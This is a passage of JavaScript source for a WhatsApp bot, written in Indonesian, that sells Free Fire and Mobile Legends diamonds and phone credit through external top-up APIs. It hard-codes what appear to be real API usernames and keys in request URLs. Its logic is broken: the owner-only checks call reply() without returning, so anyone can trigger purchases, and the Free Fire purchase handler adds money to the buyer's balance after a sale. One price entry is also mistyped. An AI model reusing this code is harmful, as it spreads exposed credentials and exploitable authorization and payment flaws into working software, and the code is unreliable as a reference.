_》${list.ff.FF1215.nama} : ${list.ff.FF1215.harga}_
_》${list.ff.FF1300.nama} : ${list.ff.FF1300.harga}_
_》${list.ff.FF1440.nama} : ${list.ff.FF1440.harga}_
_》${list.ff.FF1450.nama} : ${list.ff.FF1450.harga}_
_》${list.ff.FF1490.nama} : ${list.ff.FF1490.harga}_
_》${list.ff.FF1510.nama} : ${list.ff.FF1510.harga}_
_》${list.ff.FF1580.nama} : ${list.ff.FF1580.harga}_
_》${list.ff.FF1795.nama} : ${list.ff.FF1795.harga}_
_》${list.ff.FF1800.nama} : ${list.ff.FF1800.harga}_
_》${list.ff.FF2000.nama} : ${list.ff.FF2000.harga}_
_》${list.ff.FF2140.nama} : ${list.ff.FF2140.harga}_
_》${list.ff.FF2190.nama} : ${list.ff.FF2190.harga}_
_》${list.ff.FF2210.nama} : ${list.ff.FF2210.harga}_
_》${list.ff.FF2280.nama} : ${list.ff.FF2280.harga}_
_》${list.ff.FF2355.nama} : ${list.ff.FF2355.harga}_
_》${list.ff.FF2720.nama} : ${list.ff.FF2720.harga}_
_》${list.ff.FF4000.nama} : ${list.ff.FF4000.harga}_
_》${list.ff.FF77290.nama} : ${list.ff.FF77290.harga}_

Cara Pembelian:
${prefix}topupff ID|JUMLAH DIAMOND
Contoh:
${prefix}topupff 123456789|1450

NOTE: Pembelian Akan Diproses Oleh Sistem Otomatis Jika Saldo User Anda Terisi Dan Diamond Yang Anda Beli Akan Segera Masuk 3-5 Menit Proses.`
m.reply(lisnya)
break
case 'listdmml':
if (cekUser("id", m.sender) == null) throw mess.user
lisya = `*── 「 DIAMOND MOBILE LEGENDS 」 ──*

_》${listml.ml.UPMBL5.nama} : ${listml.ml.UPMBL5.harga}_
_》${listml.ml.UPMBL12.nama} : ${listml.ml.UPMBL12.harga}_
_》${listml.ml.UPMBL19.nama} : ${listml.ml.UPMBL19.harga}_
_》${listml.ml.UPMBL28.nama} : ${listml.ml.UPMBL28.harga}_
_》${listml.ml.UPMBL36.nama} : ${listml.ml.UPMBL36.harga}_
_》${listml.ml.UPMBL44.nama} : ${listml.ml.UPMBL44.harga}_
_》${listml.ml.UPMBL59.nama} : ${listml.ml.UPMBL59.harga}_
_》${listml.ml.UPMBL74.nama} : ${listml.ml.UPMBL74.harga}_
_》${listml.ml.UPMBL85.nama} : ${listml.ml.UPMBL85.harga}_
_》${listml.ml.UPMBL170.nama} : ${listml.ml.UPMBL170.harga}_
_》${listml.ml.UPMBL185.nama} : ${listml.ml.UPMBL185.harga}_
_》${listml.ml.UPMBL222.nama} : ${listml.ml.UPMBL222.harga}_
_》${listml.ml.UPMBL240.nama} : ${listml.ml.UPMBL240.harga}_
_》${listml.ml.UPMBL296.nama} : ${listml.ml.UPMBL296.harga}_
_》${listml.ml.UPMBL370.nama} : ${listml.ml.UPMBL370.harga}_
_》${listml.ml.UPMBL408.nama} : ${listml.ml.UPMBL408.harga}_
_》${listml.ml.UPMBL568.nama} : ${listml.ml.UPMBL568.harga}_
_》${listml.ml.UPMBL875.nama} : ${listml.ml.UPMBL875.harga}_
_》${listml.ml.UPMBL1159.nama} : ${listml.ml.UPMBL1159.harga}_
_》${listml.ml.UPMBL2010.nama} : ${listml.ml.UPMBL2010.harga}_
_》${listml.ml.UPMBL4830.nama} : ${listml.ml.UPMBL4830.harga}_

Cara Pembelian:
${prefix}topupml ID|SERVER|JUMLAH DIAMOND
Contoh:
${prefix}topupml 123456789|1450|74

NOTE: Pembelian Akan Diproses Oleh Sistem Otomatis Jika Saldo User Anda Terisi Dan Diamond Yang Anda Beli Akan Segera Masuk 3-5 Menit Proses.`
m.reply(lisya)
break
case 'listdmml2':
if (cekUser("id", m.sender) == null) throw mess.user
lisya = `*── 「 DIAMOND MOBILE LEGENDS 」 ──*

_》${listmlbb.ml.ZIDMBL17.nama} : ${listmlbb.ml.ZIDMBL17.harga}_
_》${listmlbb.ml.ZIDMBL34.nama} : ${listmlbb.ml.ZIDMBL34.harga}_
_》${listmlbb.ml.ZIDMBL50.nama} : ${listmlbb.ml.ZIDMBL50.harga}_
_》${listmlbb.ml.ZIDMBL66.nama} : ${listmlbb.ml.ZIDMBL66.harga}_
_》${listmlbb.ml.ZIDMBL74.nama} : ${listmlbb.ml.ZIDMBL74.harga}_
_》${listmlbb.ml.ZIDMBL83.nama} : ${listmlbb.ml.ZIDMBL83.harga}_
_》${listmlbb.ml.ZIDMBL184.nama} : ${listmlbb.ml.ZIDMBL184.harga}_
_》${listmlbb.ml.ZIDMBL366.nama} : ${listmlbb.ml.ZIDMBL366.harga}_
_》${listmlbb.ml.ZIDMBL758.nama} : ${listmlbb.ml.ZIDMBL758.harga}_

Cara Pembelian:
${prefix}topupml2 ID|SERVER|JUMLAH DIAMOND
Contoh:
${prefix}topupml2 123456789|1450|85

NOTE: Pembelian Akan Diproses Oleh Sistem Otomatis Jika Saldo User Anda Terisi Dan Diamond Yang Anda Beli Akan Segera Masuk 3-5 Menit Proses.`
m.reply(lisya)
break
case 'buypulsa':
if (cekUser("id", m.sender) == null) throw mess.user
let dokid = text.split("|")[0]
let cusid = text.split("|")[1]
if (isNaN(parseInt(cusid))) return m.reply('Nomor Hp Harus Berupa Angka!')

let anuni = await fetchJson(`https://trendtoday.my.id/api/transaction?username=manik729828YWOD&apikey=lq7ae3b7j6n0wgrz5arcqdh0c5o7cx&product=pulsa&nominal=${dokid}&id_costumer=${cusid}`)
let suksess = `*─ 「 LANJUTKAN PEMBAYARAN 」 ─*
                
_Silahkan Scan Qris Dan Transfer Sesuai Harga:_
_》Harga : Rp${anuni.amount}_
_》Provider : ${anuni.provider}_
_》Nomor : ${cusid} ( Pulsa )_
_》Code Trx : ${anuni.transaction_id}_

_Qr Scan Berlaku 5 Menit, Setelah 5 Menit Pesan Ini Akan Dihapus!._  

_Note: Pulsa Akan Otomatis Masuk Setelah Pembayaran Berhasil._`
let inina = await liaacans.sendMessage(m.chat, { image: { url: anuni.qr_payment }, caption: `${suksess}` }, { quoted: m })
setTimeout(() => {
liaacans.sendMessage(m.chat, { delete:inina.key })
}, 500000)
break
case prefix+'mls':{
if (!isCreator) reply('Fitur Topup Smile One Khusus Owner, Silahkan Melakukan Transaksi Dengan Owner!')
let prodc = text.split("|")[0]
let prodc2 = text.split("|")[1]
let prodcid = text.split("|")[2]
let prodcnya = `${prodc}${prodc2}`
let refer = randomNomor(001, 1000)
if (isNaN(parseInt(prodc))) return m.reply(`Id Harus Berupa Angka!\n\nContoh: ${prefix}mlsmile 23456789|2848|9288`)
if (isNaN(parseInt(prodcid))) return m.reply('Jumlah Harus Berupa Angka!')
let data = await fetchJson(`https://api.lolhuman.xyz/api/mobilelegend/${prodc}/${prodc2}?apikey=Imanmpa`)
let buttons = [{ buttonId: `mlsy ${prodc}|${prodc2}|${prodcid}`, buttonText: { displayText: 'Lanjutkan' }, type: 1 },]
if(`${data.status}` == 200) {
liaacans.sendButtonText(m.chat, buttons, `*── 「 CHECK ID OTOMATIS 」 ──*

_Silahkan Cek Data Berikut Ini:_
_》Id Game : ${prodc} (${prodc2})_
_》NickName : ${data.result}_
_》Nama Item : ${prodcid} Diamond ( Mlbb )_

Jika Data Sudah Benar Silahkan Klik Lanjutkan Dan Jika Data Salah Silahkan Mengetik Ulang Transaksi Anda!.`, liaacans.user.name, m)
} else if(`${data.status}` !== 200) {
m.reply('Invalid id/Error')
	}
break
}
case 'mlsy':{
if (!isCreator) reply('Fitur Topup Smile One Khusus Owner, Silahkan Melakukan Transaksi Dengan Owner!')
let prodc = text.split("|")[0]
let prodc2 = text.split("|")[1]
let prodcid = text.split("|")[2]
let prodcnya = `${prodc}${prodc2}`
let refer = randomNomor(001, 1000)
const axios = require('axios')
if (isNaN(parseInt(prodc))) return m.reply('Id Harus Berupa Angka!')
if (isNaN(parseInt(prodcid))) return m.reply('Jumlah Harus Berupa Angka!')
var config = {
  method: 'get',
  url: `https://v1.apigames.id/transaksi/http-get-v1?merchant=${global.merchant}&secret=${global.secret}&produk=ML${prodcid}&tujuan=${prodcnya}&ref=${refer}`,
  headers: { }
};

axios(config)
.then(function (response) {
let workid = `*── 「 TOPUP SUKSES 」 ──*\n\n_》Harga : Rp${response.data.data.product_detail.price_rp}_\n_》NickName : ${response.data.data.sn}_\n_》Nama Item : ${prodcid} Diamond ( Mlbb )_\n_》Trx Id : ${response.data.data.trx_id}_\n\n_Item Akan Segera Masuk Secara Otomatis Silahkan Melakukan Pengecekan Secara Berkala Pada Game Anda._\n\nNote: Jika Ada Kesalahan Id Atau NickName Bukan Tanggung Jawab Owner!.`
let workd = `*── 「 TOPUP GAGAL 」 ──*

Transaksi Anda Gagal, Saldo Sistem Belum terisi, Harap Tunggu Saldo Sistem Reset Setiap 6 Jam Sekali!.`
if(response.data.data.status == "Sukses"){
	reply(workid)
} else if(response.data.data.status == "Gagal"){
m.reply(workd)
}
})
break
} 
case 'mlsmile':
if (!isCreator) reply('Fitur Topup Smile One Khusus Owner, Silahkan Melakukan Transaksi Dengan Owner!')
let prodc = text.split("|")[0]
let prodc2 = text.split("|")[1]
let prodcid = text.split("|")[2]
let prodcnya = `${prodc}${prodc2}`
let refer = randomNomor(001, 1000)
if (isNaN(parseInt(prodc))) return m.reply(`Id Harus Berupa Angka!\n\nContoh: ${prefix}mlsmile 23456789|2848|9288`)
if (isNaN(parseInt(prodcid))) return m.reply('Jumlah Harus Berupa Angka!')
var axios = require('axios');
var config = {
  method: 'get',
  url: `https://v1.apigames.id/merchant/${global.merchant}/cek-username/mobilelegend?user_id=${prodcnya}&signature=${global.signature}`,
  headers: { }
};

axios(config)
.then(function (response) {
let buttons = [
{ buttonId: `mlsmiley ${prodc}|${prodc2}|${prodcid}`, buttonText: { displayText: 'Lanjutkan' }, type: 1 },
]
if (response.data.error_msg) {
m.reply('Invalid Id Or Zone')
}else if (response.data.message) {
liaacans.sendButtonText(m.chat, buttons, `*── 「 CHECK ID OTOMATIS 」 ──*

_Silahkan Cek Data Berikut Ini:_
_》Id Game : ${prodc} (${prodc2})_
_》NickName : ${response.data.data.username}_
_》Nama Item : ${prodcid} Diamond ( Mlbb )_

Jika Data Sudah Benar Silahkan Klik Lanjutkan Dan Jika Data Salah Silahkan Mengetik Ulang Transaksi Anda!.`, liaacans.user.name, m)
} 
})
.catch(function (error) {
  m.reply(error);
});
break
case 'mlsmiley':{
if (!isCreator) reply('Fitur Topup Smile One Khusus Owner, Silahkan Melakukan Transaksi Dengan Owner!')
let prodc = text.split("|")[0]
let prodc2 = text.split("|")[1]
let prodcid = text.split("|")[2]
let prodcnya = `${prodc}${prodc2}`
let refer = randomNomor(001, 1000)
const axios = require('axios')
if (isNaN(parseInt(prodc))) return m.reply('Id Harus Berupa Angka!')
if (isNaN(parseInt(prodcid))) return m.reply('Jumlah Harus Berupa Angka!')
var config = {
  method: 'get',
  url: `https://v1.apigames.id/transaksi/http-get-v1?merchant=${global.merchant}&secret=${global.secret}&produk=ML${prodcid}&tujuan=${prodcnya}&ref=${refer}`,
  headers: { }
};

axios(config)
.then(function (response) {
let workid = `*── 「 TOPUP SUKSES 」 ──*\n\n_》Harga : Rp${response.data.data.product_detail.price_rp}_\n_》NickName : ${response.data.data.sn}_\n_》Nama Item : ${prodcid} Diamond ( Mlbb )_\n_》Trx Id : ${response.data.data.trx_id}_\n\n_Item Akan Segera Masuk Secara Otomatis Silahkan Melakukan Pengecekan Secara Berkala Pada Game Anda._\n\nNote: Jika Ada Kesalahan Id Atau NickName Bukan Tanggung Jawab Owner!.`
let workd = `*── 「 TOPUP GAGAL 」 ──*

Transaksi Anda Gagal, Saldo Sistem Belum terisi, Harap Tunggu Saldo Sistem Reset Setiap 6 Jam Sekali!.`
if(response.data.data.status == "Sukses"){
	m.reply(workid)
} else if(response.data.data.status == "Gagal"){
m.reply(workd)
}
})
break
}
case 'topupff':{
if (cekUser("id", m.sender) == null) throw mess.user
if (m.isGroup) return m.reply('Fitur Ini Hanya Bisa Digunakan Di Private Chat!')
let idff = text.split("|")[0]
let produkid = text.split("|")[1]
if (isNaN(parseInt(idff))) return m.reply('Id Harus Berupa Angka!')
if (isNaN(parseInt(produkid))) return m.reply('Jumlah Harus Berupa Angka!')
let idharga = `FF${produkid}`
if (idharga == "FF5"){
global.hargadmff = 900
}
if (idharga == "FF10"){
global.hargadmff = 1800
}
if (idharga == "FF15"){
global.hargadmff = 2700
}
if (idharga == "FF20"){
global.hargadmff = 3000
}
if (idharga == "FF25"){
global.hargadmff = 3900
}
if (idharga == "FF30"){
global.hargadmff = 4800
}
if (idharga == "FF40"){
global.hargadmff = 6000
}
if (idharga == "FF50"){
global.hargadmff = 7200
}
if (idharga == "FF55"){
global.hargadmff = 8100
}
if (idharga == "FF60"){
global.hargadmff = 9000
}
if (idharga == "FF70"){
global.hargadmff = 9900
}
if (idharga == "FF75"){
global.hargadmff = 10800
}
if (idharga == "FF80"){	
global.hargadmff =11700
}
if (idharga == "FF90"){	
global.hargadmff =12900
}
if (idharga == "FF95"){	
global.hargadmff =13800
}	
if (idharga == "FF100"){	
global.hargadmff = 14400
}
if (idharga == "FF120"){	
global.hargadmff =17100
}
if (idharga == "FF130"){	
global.hargadmff =18900
}
if (idharga == "FF140"){	
global.hargadmff =19800
}	
if (idharga == "FF145"){	
global.hargadmff =20700
}
if (idharga == "FF150"){	
global.hargadmff =21600
}
if (idharga == "FF160"){	
global.hargadmff =22800
}
if (idharga == "FF180"){	
global.hargadmff =25800
}
if (idharga == "FF190"){	
global.hargadmff =27000
}
if (idharga == "FF200"){	
global.hargadmff =28800
}
if (idharga == "FF210"){	
global.hargadmff =29700
}
if (idharga == "FFM"){
global.hargadmff =30000
}
if (idharga == "FF250"){	
global.hargadmff =35700
}
if (idharga == "FF280"){	
global.hargadmff =39600
}
if (idharga == "FF300"){	
global.hargadmff =42600
}
if (idharga == "FF355"){	
global.hargadmff =49900
}
if (idharga == "FF350"){	
global.hargadmff =49500
}
if (idharga == "FF375"){	
global.hargadmff =52500
}
if (idharga == "FF400"){	
global.hargadmff =56400
}
if (idharga == "FF405"){	
global.hargadmff =56700
}
if (idharga == "FF425"){	
global.hargadmff =59400
}
if (idharga == "FF475"){	
global.hargadmff =66600
}
if (idharga == "FF500"){	
global.hargadmff =70200
}
if (idharga == "FF510"){	
global.hargadmff = 72000
}
if (idharga == "FF515"){	
global.hargadmff = 72300
}

if (idharga == "FF512"){
global.hargadmff =72300
}
if (idharga == "FF545"){	
global.hargadmff =76500
}
if (idharga == "FF565"){	
global.hargadmff =79200
}	
if (idharga == "FF600"){	
global.hargadmff =84600
}
if (idharga == "FF635"){	
global.hargadmff = 89100
}
if (idharga == "FF645"){	
global.hargadmff =90900
}
if (idharga == "FF655"){	
global.hargadmff =92100
}
if (idharga == "FF720"){	
global.hargadmff = 99000
}
if (idharga == "FF700"){	
global.hargadmff =99000
}
if (idharga == "FF770"){	
global.hargadmff =106200
}	
if (idharga == "FF790"){	
global.hargadmff = 108900
}
if (idharga == "FF800"){	
global.hargadmff = 110700
}
if (idharga == "FF860"){	
global.hargadmff = 118800
}
if (idharga == "FF930"){	
global.hargadmff =128700
}
if (idharga == "FF1000"){	
global.hargadmff =138600
}	
if (idharga == "FF1050"){	
global.hargadmff =145800
}
if (idharga == "FF1075"){	
global.hargadmff =148500
}
if (idharga == "FF1080"){	
global.hargadmff =149400
}
if (idharga == "FFB"){
global.hargadmff =150000
}
if (idharga == "FF1200"){	
global.hargadmff =166800
}
if (idharga == "FF1215"){	
global.hargadmff =16830
}
if (idharga == "FF1300"){	
global.hargadmff =180900
}
if (idharga == "FF1440"){	
global.hargadmff =198000
}
if (idharga == "FF1450"){	
global.hargadmff =199800
}
if (idharga == "FF1490"){	
global.hargadmff =205200
}
if (idharga == "FF1510"){	
global.hargadmff =207900
}
if (idharga == "FF1580"){	
global.hargadmff =217800
}
if (idharga == "FF1795"){	
global.hargadmff =247500
}
if (idharga == "FF1800"){	
global.hargadmff = 248400
}
if (idharga == "FF2000"){	
global.hargadmff =270000
}
if (idharga == "FF2140"){	
global.hargadmff = 289800
}
if (idharga == "FF2190"){	
global.hargadmff = 297000
}
if (idharga == "FF2210"){	
global.hargadmff = 299700
}
if (idharga == "FF2280"){	
global.hargadmff = 309600
}
if (idharga == "FF2355"){	
global.hargadmff = 319500
}
if (idharga == "FF2720"){	
global.hargadmff = 369000
}
if (idharga == "FF4000"){
global.hargadmff = 540000
}
if (idharga == "FF77290"){
global.hargadmff = 990000
}

var axios = require('axios');

var config = {
  method: 'get',
  url: `https://v1.apigames.id/merchant/${global.merchant}/cek-username/freefire?user_id=${idff}&signature=${global.signature}`,
  headers: { }
};

axios(config)
.then(function (response) {
let buttons = [
{ buttonId: `topupffyes ${idff}|${produkid}`, buttonText: { displayText: 'Lanjutkan' }, type: 1 },
]
if (response.data.error_msg) {
m.reply('Invalid Id')
} else if(response.data.message) {
liaacans.sendButtonText(m.chat, buttons, `*── 「 CHECK ID OTOMATIS 」 ──*
                
_Silahkan Cek Data Berikut Ini:_
_》Id Game : ${idff}_
_》NickName : ${response.data.data.username}_
_》Nama Item : ${produkid} Diamond ( FreeFire )_

Jika Data Sudah Benar Silahkan Klik Lanjutkan Dan Jika Data Salah Silahkan Mengetik Ulang Transaksi Anda!.`, liaacans.user.name, m)
} 
})
.catch(function (error) {
  console.log(error);
});
break
}
case 'topupffyes':{
if (cekUser("id", m.sender) == null) throw mess.user
if (m.isGroup) return m.reply('Fitur Ini Hanya Bisa Digunakan Di Private Chat!')
let idff = text.split("|")[0]
let produkid = text.split("|")[1]
let refdi = randomNomor(001, 1000)
let refid = `${refdi}`
let idharga = `FF${produkid}`
var axios = require('axios');
var config = {
  method: 'get',
  url: `https://v1.apigames.id/transaksi/http-get-v1?merchant=${global.merchant}&secret=${global.secret}&produk=FF${produkid}&tujuan=${idff}&ref=TRX${refid}`,
  headers: { }
};

axios(config)
.then(function (response) {
let idharga = `FF${produkid}`
if (idharga == "FF5"){
global.hargadmff = 900
}
if (idharga == "FF10"){
global.hargadmff = 1800
}
if (idharga == "FF15"){
global.hargadmff = 2700
}
if (idharga == "FF20"){
global.hargadmff = 3000
}
if (idharga == "FF25"){
global.hargadmff = 3900
}
if (idharga == "FF30"){
global.hargadmff = 4800
}
if (idharga == "FF40"){
global.hargadmff = 6000
}
if (idharga == "FF50"){
global.hargadmff = 7200
}
if (idharga == "FF55"){
global.hargadmff = 8100
}
if (idharga == "FF60"){
global.hargadmff = 9000
}
if (idharga == "FF70"){
global.hargadmff = 9900
}
if (idharga == "FF75"){
global.hargadmff = 10800
}
if (idharga == "FF80"){	
global.hargadmff =11700
}
if (idharga == "FF90"){	
global.hargadmff =12900
}
if (idharga == "FF95"){	
global.hargadmff =13800
}	
if (idharga == "FF100"){	
global.hargadmff = 14400
}
if (idharga == "FF120"){	
global.hargadmff =17100
}
if (idharga == "FF130"){	
global.hargadmff =18900
}
if (idharga == "FF140"){	
global.hargadmff =19800
}	
if (idharga == "FF145"){	
global.hargadmff =20700
}
if (idharga == "FF150"){	
global.hargadmff =21600
}
if (idharga == "FF160"){	
global.hargadmff =22800
}
if (idharga == "FF180"){	
global.hargadmff =25800
}
if (idharga == "FF190"){	
global.hargadmff =27000
}
if (idharga == "FF200"){	
global.hargadmff =28800
}
if (idharga == "FF210"){	
global.hargadmff =29700
}
if (idharga == "FFM"){
global.hargadmff =30000
}
if (idharga == "FF250"){	
global.hargadmff =35700
}
if (idharga == "FF280"){	
global.hargadmff =39600
}
if (idharga == "FF300"){	
global.hargadmff =42600
}
if (idharga == "FF355"){	
global.hargadmff =49900
}
if (idharga == "FF350"){	
global.hargadmff =49500
}
if (idharga == "FF375"){	
global.hargadmff =52500
}
if (idharga == "FF400"){	
global.hargadmff =56400
}
if (idharga == "FF405"){	
global.hargadmff =56700
}
if (idharga == "FF425"){	
global.hargadmff =59400
}
if (idharga == "FF475"){	
global.hargadmff =66600
}
if (idharga == "FF500"){	
global.hargadmff =70200
}
if (idharga == "FF510"){	
global.hargadmff = 72000
}
if (idharga == "FF515"){	
global.hargadmff = 72300
}

if (idharga == "FF512"){
global.hargadmff =72300
}
if (idharga == "FF545"){	
global.hargadmff =76500
}
if (idharga == "FF565"){	
global.hargadmff =79200
}	
if (idharga == "FF600"){	
global.hargadmff =84600
}
if (idharga == "FF635"){	
global.hargadmff = 89100
}
if (idharga == "FF645"){	
global.hargadmff =90900
}
if (idharga == "FF655"){	
global.hargadmff =92100
}
if (idharga == "FF720"){	
global.hargadmff = 99000
}
if (idharga == "FF700"){	
global.hargadmff =99000
}
if (idharga == "FF770"){	
global.hargadmff =106200
}	
if (idharga == "FF790"){	
global.hargadmff = 108900
}
if (idharga == "FF800"){	
global.hargadmff = 110700
}
if (idharga == "FF860"){	
global.hargadmff = 118800
}
if (idharga == "FF930"){	
global.hargadmff =128700
}
if (idharga == "FF1000"){	
global.hargadmff =138600
}	
if (idharga == "FF1050"){	
global.hargadmff =145800
}
if (idharga == "FF1075"){	
global.hargadmff =148500
}
if (idharga == "FF1080"){	
global.hargadmff =149400
}
if (idharga == "FFB"){
global.hargadmff =150000
}
if (idharga == "FF1200"){	
global.hargadmff =166800
}
if (idharga == "FF1215"){	
global.hargadmff =16830
}
if (idharga == "FF1300"){	
global.hargadmff =180900
}
if (idharga == "FF1440"){	
global.hargadmff =198000
}
if (idharga == "FF1450"){	
global.hargadmff =199800
}
if (idharga == "FF1490"){	
global.hargadmff =205200
}
if (idharga == "FF1510"){	
global.hargadmff =207900
}
if (idharga == "FF1580"){	
global.hargadmff =217800
}
if (idharga == "FF1795"){	
global.hargadmff =247500
}
if (idharga == "FF1800"){	
global.hargadmff = 248400
}
if (idharga == "FF2000"){	
global.hargadmff =270000
}
if (idharga == "FF2140"){	
global.hargadmff = 289800
}
if (idharga == "FF2190"){	
global.hargadmff = 297000
}
if (idharga == "FF2210"){	
global.hargadmff = 299700
}
if (idharga == "FF2280"){	
global.hargadmff = 309600
}
if (idharga == "FF2355"){	
global.hargadmff = 319500
}
if (idharga == "FF2720"){	
global.hargadmff = 369000
}
if (idharga == "FF4000"){
global.hargadmff = 540000
}
if (idharga == "FF77290"){
global.hargadmff = 990000
}
let workid = `*── 「 TOPUP SUKSES 」 ──*\n\n_》Harga : Rp${global.hargadmff}_\n_》NickName : ${response.data.data.sn}_\n_》Nama Item : ${produkid} Diamond ( FreeFire )_\n_》Trx Id : ${response.data.data.trx_id}_\n\n_Item Akan Segera Masuk Secara Otomatis Silahkan Melakukan Pengecekan Secara Berkala Pada Game Anda.\n\nNote: Jika Ada Kesalahan Id Atau NickName Bukan Tanggung Jawab Owner!.`
let workd = `*── 「 TOPUP GAGAL 」 ──*

Transaksi Anda Gagal, Saldo Sistem Belum terisi Saldo User Anda Tidak Akan Dipotong, Harap Tumggu Saldo Sistem Reset Setiap 6 Jam Sekali!.`
if(response.data.data.status == "Sukses"){
if (idharga == "FF5"){
moneyAdd(m.sender, 900)
m.reply(workid)
}
if (idharga == "FF10"){
moneyAdd(m.sender, 1800)
m.reply(workid)
}
if (idharga == "FF15"){
moneyAdd(m.sender, 2700)
m.reply(workid)
}
if (idharga == "FF20"){
moneyAdd(m.sender, 3000)
m.reply(workid)
}
if (idharga == "FF25"){
moneyAdd(m.sender, 3900)
m.reply(workid)
}
if (idharga == "FF30"){
moneyAdd(m.sender, 4800)
m.reply(workid)
}
if (idharga == "FF40"){
moneyAdd(m.sender, 6000)
m.reply(workid)
}
if (idharga == "FF50"){
moneyAdd(m.sender, 7200)
m.reply(workid)
}
if (idharga == "FF55"){
moneyAdd(m.sender, 8100)
m.reply(workid)
}
if (idharga == "FF60"){
moneyAdd(m.sender, 9000)
m.reply(workid)
}
if (idharga == "FF70"){
moneyAdd(m.sender, 9900)
m.reply(workid)
}
if (idharga == "FF75"){
moneyAdd(m.sender, 10800)
m.reply(workid)
}
if (idharga == "FF80"){	
moneyAdd(m.sender,11700)
m.reply(workid)
}
if (idharga == "FF90"){	
moneyAdd(m.sender,12900)
m.reply(workid)
}
if (idharga == "FF95"){	
moneyAdd(m.sender,13800)
m.reply(workid)
}	
if (idharga == "FF100"){	
moneyAdd(m.sender, 14400)
m.reply(workid)
}
if (idharga == "FF120"){	
moneyAdd(m.sender,17100)
m.reply(workid)
}
if (idharga == "FF130"){	
moneyAdd(m.sender,18900)
m.reply(workid)
}
if (idharga == "FF140"){	
moneyAdd(m.sender,19800)
m.reply(workid)
}	
if (idharga == "FF145"){	
moneyAdd(m.sender,20700)
m.reply(workid)
}
if (idharga == "FF150"){	
moneyAdd(m.sender,21600)
m.reply(workid)
}
if (idharga == "FF160"){	
moneyAdd(m.sender,22800)
m.reply(workid)
}
if (idharga == "FF180"){	
moneyAdd(m.sender,25800)
m.reply(workid)
}
if (idharga == "FF190"){	
moneyAdd(m.sender,27000)
m.reply(workid)
}
if (idharga == "FF200"){	
moneyAdd(m.sender,28800)
m.reply(workid)
}
if (idharga == "FF210"){	
moneyAdd(m.sender,29700)
m.reply(workid)
}
if (idharga == "FFM"){
moneyAdd(m.sender,30000)
m.reply(workid)
}
if (idharga == "FF250"){	
moneyAdd(m.sender,35700)
m.reply(workid)
}
if (idharga == "FF280"){	
moneyAdd(m.sender,39600)
m.reply(workid)
}
if (idharga == "FF300"){	
moneyAdd(m.sender,42600)
m.reply(workid)
}
if (idharga == "FF355"){	
moneyAdd(m.sender,49900)
m.reply(workid)
}
if (idharga == "FF350"){	
moneyAdd(m.sender,49500)
m.reply(workid)
}
if (idharga == "FF375"){	
moneyAdd(m.sender,52500)
m.reply(workid)
}
if (idharga == "FF400"){	
moneyAdd(m.sender,56400)
m.reply(workid)
}
if (idharga == "FF405"){	
moneyAdd(m.sender,56700)
m.reply(workid)
}
if (idharga == "FF425"){	
moneyAdd(m.sender,59400)
m.reply(workid)
}
if (idharga == "FF475"){	
moneyAdd(m.sender,66600)
m.reply(workid)
}
if (idharga == "FF500"){	
moneyAdd(m.sender,70200)
m.reply(workid)
}
if (idharga == "FF510"){	
moneyAdd(m.sender, 72000)
m.reply(workid)
}
if (idharga == "FF515"){	
moneyAdd(m.sender, 72300)
m.reply(workid)
}

if (idharga == "FF512"){
moneyAdd(m.sender,72300)
m.reply(workid)
}
if (idharga == "FF545"){	
moneyAdd(m.sender,76500)
m.reply(workid)
}
if (idharga == "FF565"){	
moneyAdd(m.sender,79200)
m.reply(workid)
}	
if (idharga == "FF600"){	
moneyAdd(m.sender,84600)
m.reply(workid)
}
if (idharga == "FF635"){	
moneyAdd(m.sender, 89100)
m.reply(workid)
}
if (idharga == "FF645"){	
moneyAdd(m.sender,90900)
m.reply(workid)
}
if (idharga == "FF655"){	
moneyAdd(m.sender,92100)
m.reply(workid)
}
if (idharga == "FF720"){	
moneyAdd(m.sender, 99000)
m.reply(workid)
}
if (idharga == "FF700"){	
moneyAdd(m.sender,99000)
m.reply(workid)
}
if (idharga == "FF770"){	
moneyAdd(m.sender,106200)
m.reply(workid)
}	
if (idharga == "FF790"){	
moneyAdd(m.sender, 108900)
m.reply(workid)
}
if (idharga == "FF800"){	
moneyAdd(m.sender, 110700)
m.reply(workid)
}
if (idharga == "FF860"){	
moneyAdd(m.sender, 118800)
m.reply(workid)
}
if (idharga == "FF930"){	
moneyAdd(m.sender,128700)
m.reply(workid)
}
if (idharga == "FF1000"){	
moneyAdd(m.sender,138600)
m.reply(workid)
}	
if (idharga == "FF1050"){	
moneyAdd(m.sender,145800)
m.reply(workid)
}
if (idharga == "FF1075"){	
moneyAdd(m.sender,148500)
m.reply(workid)
}
if (idharga == "FF1080"){	
moneyAdd(m.sender,149400)
m.reply(workid)
}
if (idharga == "FFB"){
moneyAdd(m.sender,150000)
m.reply(workid)
}
if (idharga == "FF1200"){	
moneyAdd(m.sender,166800)
m.reply(workid)
}
if (idharga == "FF1215"){	
moneyAdd(m.sender,16830)
m.reply(workid)
}
if (idharga == "FF1300"){	
moneyAdd(m.sender,180900)
m.reply(workid)
}
if (idharga == "FF1440"){	
moneyAdd(m.sender,198000)
m.reply(workid)
}
if (idharga == "FF1450"){	
moneyAdd(m.sender,199800)
m.reply(workid)
}
if (idharga == "FF1490"){	
moneyAdd(m.sender,205200)
m.reply(workid)
}
if (idharga == "FF1510"){	
moneyAdd(m.sender,207900)
m.reply(workid)
}
if (idharga == "FF1580"){	
moneyAdd(m.sender,217800)
m.reply(workid)
}
if (idharga == "FF1795"){	
moneyAdd(m.sender,247500)
m.reply(workid)
}
if (idharga == "FF1800"){	
moneyAdd(m.sender, 248400)
m.reply(workid)
}
if (idharga == "FF2000"){	
moneyAdd(m.sender,270000)
m.reply(workid)
}
if (idharga == "FF2140"){	
moneyAdd(m.sender, 289800)
m.reply(workid)
}
if (idharga == "FF2190"){	
moneyAdd(m.sender, 297000)
m.reply(workid)
}
if (idharga == "FF2210"){	
moneyAdd(m.sender, 299700)
m.reply(workid)
}
if (idharga == "FF2280"){	
moneyAdd(m.sender, 309600)
m.reply(workid)
}
if (idharga == "FF2355"){	
moneyAdd(m.sender, 319500)
m.reply(workid)
}
if (idharga == "FF2720"){	
moneyAdd(m.sender, 369000)
m.reply(workid)
}
if (idharga == "FF4000"){
moneyAdd(m.sender, 540000)
m.reply(workid)
}
if (idharga == "FF77290"){
moneyAdd(m.sender, 990000)
m.reply(workid)
}
} else if(response.data.data.status == "Gagal"){
m.reply(workd)
}
})
break
}
case 'topupml':{
if (cekUser("id", m.sender) == null) throw mess.user
if (m.isGroup) return m.reply('Fitur Ini Hanya Bisa Digunakan Di Private Chat!')
let idml1 = text.split("|")[0]
let idml2 = text.split("|")[1]
let idml = `${idml1}${idml2}`
let produkid = text.split("|")[2]
